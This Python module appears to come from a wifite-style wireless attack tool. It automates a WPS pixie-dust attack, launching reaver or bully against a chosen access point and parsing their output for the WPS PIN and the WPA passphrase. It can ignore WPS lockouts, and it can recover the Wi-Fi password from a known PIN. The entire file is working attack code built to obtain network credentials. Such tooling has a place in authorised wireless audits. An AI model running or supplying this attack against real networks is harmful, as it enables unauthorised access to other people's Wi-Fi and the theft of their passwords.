# -*- coding: utf-8 -*-
"""WPS pixie-dust attack via reaver (bully fallback).

Unlike the old wifite scraper, this reads only the handful of decisive reaver /
bully lines — PIN, PSK, and the lock/timeout failures — which are stable across
tool versions.
"""
import re
import select
import subprocess
import time

import config
from attack import interface as iface_mod
from attack import tools
from attack.model import AttackEvent, EventType


# Reaver + bully PIN/PSK lines (pixie and -p recover).
PIN_RE = re.compile(
    r"(?:WPS PIN|PIN FOUND|Pin is|setting pin to)\s*:?\s*'?([0-9]{4,8})'?",
    re.I)
PSK_RE = re.compile(
    r"(?:WPA PSK|key is)\s*:?\s*'([^']*)'",
    re.I)
# Terminal failures only — "Failed to associate" is a normal reaver retry.
FAIL_RE = re.compile(
    r"pin not found|pixie-?dust.*fail|failed to recover WPA key",
    re.I)
# Hard WPS lockout. Rate-limiting waits are non-terminal (reaver sleeps + retries).
HARD_LOCK_RE = re.compile(
    r"WPS lock(?:out)?|AP (?:is )?locked|WARNING.*(?:WPS )?lock",
    re.I)

GETPSK_TIMEOUT = 120


def _build_cmd(tool, mon, target, ignore_locks):
    bssid = target["bssid"]
    channel = str(target.get("channel") or "")
    if tool == "bully":
        cmd = [tools.BULLY, "-b", bssid, "-d", "-v", "3"]
        if channel:
            cmd += ["-c", channel]
        if ignore_locks:
            cmd.append("-L")
        cmd.append(mon)
        return cmd
    # reaver: -K 1 = pixie-dust, -N no-nacks, -vv verbose
    cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-K", "1", "-N", "-vv"]
    if channel:
        cmd += ["-c", channel]
    if ignore_locks:
        cmd.append("-L")
    return cmd


def pixie(mon, target, req, emit, stop_flag):
    """Run a WPS pixie-dust attack on one target.

    Returns {"ok","psk","pin","essid","bssid"}.
    """
    bssid = target["bssid"]
    essid = target.get("essid") or bssid
    tool = config.opt_state(req.attack_modes, "WPS Tool", "reaver")
    ignore_locks = config.opt_bool(req.attack_modes, "Ignore Locks", False)
    timeout = config.opt_int(req.timing, "WPS Timeout", 180)

    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return {"ok": False, "essid": essid, "bssid": bssid}

    cmd = _build_cmd(tool, mon, target, ignore_locks)
    tools.log("wps pixie: %s" % " ".join(cmd))
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, bufsize=1, text=True)
    except Exception as e:  # noqa: BLE001
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=str(e)[:20]))
        return {"ok": False, "essid": essid, "bssid": bssid}

    start = time.time()
    pin = None
    psk = None
    result = {"ok": False, "essid": essid, "bssid": bssid}
    fd = proc.stdout.fileno()
    try:
        while True:
            if stop_flag and stop_flag.is_set():
                result["cancelled"] = True
                break
            if (time.time() - start) > timeout:
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="timeout"))
                break
            ready, _, _ = select.select([fd], [], [], 0.5)
            if not ready:
                continue
            line = proc.stdout.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue

            m = PIN_RE.search(line)
            if m:
                pin = m.group(1)
            m = PSK_RE.search(line)
            if m:
                psk = m.group(1)
            # Full success = we have the PSK. A pixie-recovered PIN alone ends the
            # loop too, but the PSK is fetched afterwards from the PIN.
            if psk is not None:
                break
            if pin and re.search(r"pixie", line, re.I) and "PIN" in line.upper():
                break
            if HARD_LOCK_RE.search(line) and not ignore_locks:
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="wps lock"))
                break
            if FAIL_RE.search(line):
                emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                                 detail="no pin"))
                break
            # Heartbeat for the live status screen (structured countdown).
            emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                             phase="PIXIE",
                             countdown=max(0, int(timeout - (time.time() - start))),
                             cd_max=timeout, signal=target.get("signal")))
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:  # noqa: BLE001
            try:
                proc.kill()
            except Exception:  # noqa: BLE001
                pass

    # Got a PIN but not the PSK (the M7 exchange didn't complete). Use the known
    # PIN to fetch the actual WPA PSK — that's what the PIN is *for*.
    if pin and psk is None and not (stop_flag and stop_flag.is_set()):
        emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                         phase="GETPSK", countdown=GETPSK_TIMEOUT,
                         cd_max=GETPSK_TIMEOUT,
                         signal=target.get("signal")))
        psk = _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
                           tool=tool, ignore_locks=ignore_locks,
                           timeout=GETPSK_TIMEOUT)

    if psk is not None or pin:
        # PSK = the Wi-Fi password (connectable). PIN alone = not connectable yet.
        emit(AttackEvent(EventType.CRACKED, essid=essid, bssid=bssid,
                         credential=psk, pin=pin))
        result = {"ok": True, "psk": psk, "pin": pin,
                  "essid": essid, "bssid": bssid}
    return result


def recover_psk(iface, target, pin, emit, stop_flag=None, timeout=GETPSK_TIMEOUT):
    """Standalone PIN -> PSK recovery, driven from the UI (cracked detail view).

    Enables monitor mode on the external adapter, runs `reaver -p <pin>`, then
    restores the interface. Returns the PSK string, or None on failure/cancel.
    """
    essid = target.get("essid") or target.get("bssid")
    bssid = target.get("bssid")
    name = iface_mod.iface_name(iface)
    tool = "bully" if (not tools.tool_ok(tools.REAVER)
                       and tools.tool_ok(tools.BULLY)) else "reaver"
    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return None
    try:
        with iface_mod.monitor_mode(name) as mon:
            return _recover_psk(mon, target, pin, emit, essid, bssid,
                                stop_flag, timeout=timeout, tool=tool,
                                ignore_locks=True)
    except RuntimeError as e:
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=str(e)[:20]))
        return None


def _recover_psk(mon, target, pin, emit, essid, bssid, stop_flag,
                 timeout=GETPSK_TIMEOUT, tool="reaver", ignore_locks=False):
    """Recover the WPA PSK from a known WPS PIN: `-p <pin>` does one WPS
    registration and prints the PSK. Uses whichever tool found the PIN (reaver
    or bully) — a pixie run with one shouldn't silently fail to fetch the PSK
    just because the other isn't installed. Returns the PSK string or None."""
    bin_path = tools.BULLY if tool == "bully" else tools.REAVER
    if not tools.tool_ok(bin_path):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail="%s missing" % tool))
        return None
    if tool == "bully":
        cmd = [tools.BULLY, "-b", bssid, "-p", str(pin), "-d", "-v", "3"]
        if target.get("channel"):
            cmd += ["-c", str(target["channel"])]
        if ignore_locks:
            cmd.append("-L")
        cmd.append(mon)
    else:
        # -N matches pixie; association retries must not abort recover.
        cmd = [tools.REAVER, "-i", mon, "-b", bssid, "-p", str(pin),
               "-N", "-vv"]
        if target.get("channel"):
            cmd += ["-c", str(target["channel"])]
        if ignore_locks:
            cmd.append("-L")
    tools.log("wps psk-recover: %s" % " ".join(cmd))
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, bufsize=1, text=True)
    except Exception:  # noqa: BLE001
        return None
    start = time.time()
    psk = None
    fail_detail = None
    fd = proc.stdout.fileno()
    try:
        while (time.time() - start) < timeout:
            if stop_flag and stop_flag.is_set():
                break
            ready, _, _ = select.select([fd], [], [], 0.5)
            if not ready:
                emit(AttackEvent(EventType.PHASE, essid=essid, bssid=bssid,
                                 phase="GETPSK",
                                 countdown=max(0, int(timeout - (time.time() - start))),
                                 cd_max=timeout))
                continue
            line = proc.stdout.readline()
            if not line:
                break
            line = line.strip()
            if not line:
                continue
            tools.log("wps psk-recover: %s" % line)
            m = PSK_RE.search(line)
            if m:
                psk = m.group(1)
                break
            # Rate limiting: reaver waits and retries — keep listening.
            if re.search(r"rate limiting", line, re.I):
                continue
            if HARD_LOCK_RE.search(line) and not ignore_locks:
                fail_detail = "wps lock"
                break
            if FAIL_RE.search(line):
                fail_detail = "no psk"
                break
        else:
            fail_detail = fail_detail or "timeout"
    finally:
        try:
            proc.terminate()
            proc.wait(timeout=3)
        except Exception:  # noqa: BLE001
            try:
                proc.kill()
            except Exception:  # noqa: BLE001
                pass
    if psk is None and fail_detail and not (stop_flag and stop_flag.is_set()):
        emit(AttackEvent(EventType.FAILED, essid=essid, bssid=bssid,
                         detail=fail_detail))
    return psk
